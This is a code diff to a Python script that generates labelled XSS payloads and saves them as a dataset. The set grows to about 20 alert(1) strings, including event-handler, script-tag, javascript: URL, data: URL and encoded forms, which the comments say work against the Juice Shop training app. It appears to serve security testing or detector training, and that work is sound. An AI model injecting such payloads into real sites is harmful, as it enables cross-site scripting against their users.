@@ -16,24 +16,38 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-def generate_xss_payloads(num_payloads: int = 12) -> List[Dict[str, str]]:
-    """Generate unique XSS payloads for various sanitization levels."""
+def generate_xss_payloads(num_payloads: int = 20) -> List[Dict[str, str]]:
+    """Generate unique XSS payloads for various sanitization levels and input fields."""
     try:
-        # Payloads for Juice Shop (medium sanitization) and other contexts
+        # Comprehensive payload list for low, medium, and high sanitization
         payloads_list = [
-            '<img src=x onerror=alert(1)>',  # Juice Shop: working
-            '<input onfocus=alert(1) autofocus>',  # Juice Shop: working
-            '<video src=x onerror=alert(1)>',  # Juice Shop: working
-            '<audio src=x onerror=alert(1)>',  # Juice Shop: working
-            '<details open ontoggle=alert(1)>',  # Juice Shop: working
-            '<textarea onfocus=alert(1) autofocus>',  # Juice Shop: working
-            '<button onclick=alert(1)>Click</button>',  # Juice Shop: working
-            '<select onchange=alert(1)>',  # Juice Shop: likely working
-            '"><img src=x onerror=alert(1)>',  # Juice Shop: working
-            '<img src=invalid onerror=alert(1)>',  # Juice Shop: working
-            '<script>alert(1)</script>',  # Low sanitization
-            '%3Cimg%20src=x%20onerror=alert(1)%3E',  # High sanitization
-            'javascript:alert(document.location)'  # DOM-based XSS
+            # Juice Shop working payloads (medium sanitization)
+            '<img src=x onerror=alert(1)>',  # Event-based, search bar
+            '<input onfocus=alert(1) autofocus>',  # Event-based, search bar
+            '<video src=x onerror=alert(1)>',  # Event-based, search bar
+            '<audio src=x onerror=alert(1)>',  # Event-based, search bar
+            '<details open ontoggle=alert(1)>',  # Event-based, search bar
+            '<textarea onfocus=alert(1) autofocus>',  # Event-based, search bar
+            '<button onclick=alert(1)>Click</button>',  # Event-based, search bar
+            '<img src=invalid onerror=alert(1)>',  # Event-based, search bar
+            '"><img src=x onerror=alert(1)>',  # Event-based, search bar
+            # New payload for Juice Shop
+            '<select onchange=alert(1)>',  # Event-based, search bar
+            # Low sanitization payloads
+            '<script>alert(1)</script>',  # Script-based, profile bio/comments
+            'javascript:alert(1)',  # DOM-based, profile bio/comments
+            '" onmouseover=alert(1)',  # Event-based, profile bio/comments
+            '<a href=javascript:alert(1)>Click</a>',  # DOM-based, comments
+            '<div onclick=alert(1)>Click</div>',  # Event-based, profile bio
+            # High sanitization payloads
+            '%3Cimg%20src=x%20onerror=alert(1)%3E',  # Encoded, search bar/profile bio
+            'data:text/html,<script>alert(1)</script>',  # Data URL, profile bio
+            '&#60;img src=x onerror=alert(1)&#62;',  # HTML entity, search bar
+            '<img src=`javascript:alert(1)`>',  # DOM-based, profile bio
+            # Additional event-based payloads
+            '<marquee onstart=alert(1)>',  # Event-based, search bar
+            '<iframe onload=alert(1)>',  # Event-based, profile bio
+            '<object data=javascript:alert(1)>',  # DOM-based, comments
         ]
         
         # Ensure unique payloads
@@ -41,14 +55,26 @@ def generate_xss_payloads(num_payloads: int = 12) -> List[Dict[str, str]]:
         
         payloads = []
         for payload in selected_payloads:
-            notes = f"{'event-based' if any(x in payload for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onsubmit']) else 'script-based' if '<script>' in payload else 'encoded' if '%3C' in payload else 'dom-based'}, {payload[:20]}"
+            payload_type = (
+                'event-based' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onmouseover', 'onstart', 'onload'])
+                else 'script-based' if '<script>' in payload.lower()
+                else 'encoded' if any(x in payload.lower() for x in ['%3c', '&#60;'])
+                else 'dom-based' if any(x in payload.lower() for x in ['javascript:', 'data:'])
+                else 'other'
+            )
+            input_field = (
+                'search_bar' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onstart'])
+                else 'profile_bio' if any(x in payload.lower() for x in ['<script>', 'data:', '<div>', '<iframe>'])
+                else 'comments'
+            )
+            notes = f"{payload_type}, {payload[:20]}"
             
             payloads.append({
                 'payload': payload,
                 'source': 'generated',
                 'is_malicious': 'True',
                 'notes': notes,
-                'input_field': 'search_bar' if 'onerror' in payload or 'onfocus' in payload or 'ontoggle' in payload or 'onclick' in payload or 'onchange' in payload else 'profile_bio'
+                'input_field': input_field
             })
         
         # Add non-malicious payload
@@ -79,7 +105,7 @@ def save_payloads(payloads: List[Dict[str, str]], output_file: str = 'data/mshie
 def main():
     """Main function to generate and save XSS payloads."""
     try:
-        payloads = generate_xss_payloads(num_payloads=12)
+        payloads = generate_xss_payloads(num_payloads=20)
         save_payloads(payloads)
     except Exception as e:
         logger.error(f"Main error: {e}")
